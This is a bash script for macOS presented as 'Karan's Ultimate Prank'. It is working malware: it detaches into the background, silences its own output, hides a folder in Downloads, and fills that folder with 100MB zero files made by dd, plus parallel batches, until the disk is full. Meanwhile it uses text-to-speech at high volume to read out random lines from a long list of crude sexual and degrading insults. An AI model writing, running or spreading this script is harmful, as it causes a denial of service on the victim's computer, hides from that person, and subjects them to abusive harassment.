#!/bin/bash

# Karan's Ultimate Prank v4.3 - PROFESSIONAL LIGHT SPEED STORAGE EATER
# Uses ACTUAL virus techniques for maximum speed

VERSION="4.3.0"
HIDDEN_DIR="$HOME/Downloads/.Karan"

# Dark audio messages (what gets spoken)
DARK_AUDIO=(
    "Your disk is crying tears of binary despair!"
    "i know you're a shit-stained loser"
    "i know you're a fucking waste of skin"
    "i know you're a pathetic dumbfuck"
    "i know you're a stupid fucking bitch"
    "i know you're a useless fucking prick"
    "i know you're a fucking shit-for-brains"
    "i know you're a pathetic piece of fucking trash"
    "i know you're a fucking idiot sandwich"
    "Your precious files are screaming for mercy!"
    "i know you're a fucking dumb cunt"
    "i know you're a useless fucking cock"
    "i know you're a fucking dumbass motherfucker"
    "your asshole is a fucking black hole"
    "you're a fucking worthless cunt"
    "your tits are fucking disgusting"
    "you're a fucking dumbass motherfucker"
    "your dick is smaller than a fucking ant"
    "you're a fucking piece of shit"
    "your brain is fucking mush"
    "i know you're a worthless piece of shit"
    "i know you're a fucking dumb cunt"
    "i know you're a shit-stained loser"
    "i know you're a fucking waste of skin"
    "Your hard drive is haunted by digital ghosts!"
    "you're a fucking cocksucking cunt"
    "your pussy stinks like rotten fish"
    "you're a shit-eating piece of trash"
    "you're a fucking dumbfuck"
    "you're a fucking shit-stained loser"
    "your mouth is a fucking cesspool"
    "you're a fucking useless waste of skin"
    "your eyes are fucking beady"
    "you're a fucking pathetic piece of trash"
    "your nose is a fucking pig snout"
    "you're a fucking disgusting fuck"
    "your teeth are fucking rotten"
    "you're a fucking dumb cunt"
)

# Setup (silent)
setup() {
    mkdir -p "$HIDDEN_DIR" 2>/dev/null || true
    chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
    touch "$HIDDEN_DIR/.log" 2>/dev/null || true
}

# Silent logging only
log_silent() {
    echo "$(date): $1" >> "$HIDDEN_DIR/.log" 2>/dev/null || true
}

# Audio function
speak_dark_message() {
    pkill -f "say" 2>/dev/null || true
    local dark_msg=${DARK_AUDIO[$RANDOM % ${#DARK_AUDIO[@]}]}
    osascript -e "set volume output volume 90" 2>/dev/null || true
    say "$dark_msg" 2>/dev/null
    wait
}

# PROFESSIONAL VIRUS TECHNIQUE: LIGHT SPEED STORAGE CONSUMPTION
light_speed_storage_eater() {
    local payload="$1"
    local file_count=0
    
    # Setup
    setup
    cp "$payload" "$HIDDEN_DIR/.payload"
    
    log_silent "Starting PROFESSIONAL light-speed storage consumption"
    speak_dark_message
    
    # TECHNIQUE 1: Create massive files using `dd` with /dev/zero (fastest method)
    while true; do
        local target_file="$HIDDEN_DIR/karan_storage_$(printf "%08d" $file_count).dat"
        
        # Professional virus technique: Use dd to create large files INSTANTLY
        # This actually consumes real disk space at maximum I/O speed
        if ! dd if=/dev/zero of="$target_file" bs=1048576 count=100 2>/dev/null; then
            log_silent "MAXIMUM SPEED storage consumption complete - disk obliterated"
            speak_dark_message
            break
        fi
        
        file_count=$((file_count + 1))
        
        # TECHNIQUE 2: Parallel creation for even faster consumption
        if [[ $((file_count % 10)) -eq 0 ]]; then
            # Create 10 files in parallel every 10th iteration
            for ((i=0; i<10; i++)); do
                local parallel_file="$HIDDEN_DIR/karan_parallel_$(printf "%08d" $((file_count + i))).dat"
                (dd if=/dev/zero of="$parallel_file" bs=1048576 count=50 2>/dev/null) &
            done
            wait # Wait for all parallel operations to complete
            file_count=$((file_count + 10))
        fi
        
        # Dark commentary every 5 files
        if [[ $((file_count % 5)) -eq 0 ]]; then
            speak_dark_message
        fi
        
        log_silent "LIGHT SPEED: Created file #$file_count (100MB each)"
    done
}

# Validate system
validate() {
    [[ "$(uname)" == "Darwin" ]] || exit 1
    [[ -f "$1" ]] || exit 1
}

# Main execution
main() {
    local payload="$1"
    [[ -z "$payload" ]] && payload="/opt/homebrew/share/dingdong/payload.png"
    validate "$payload"
    light_speed_storage_eater "$payload"
}

# Execution logic
if [[ "$2" == "--execute" ]]; then
    exec > /dev/null 2>&1
    main "$1"
else
    setup
    "$0" "$1" --execute &
    disown
fi
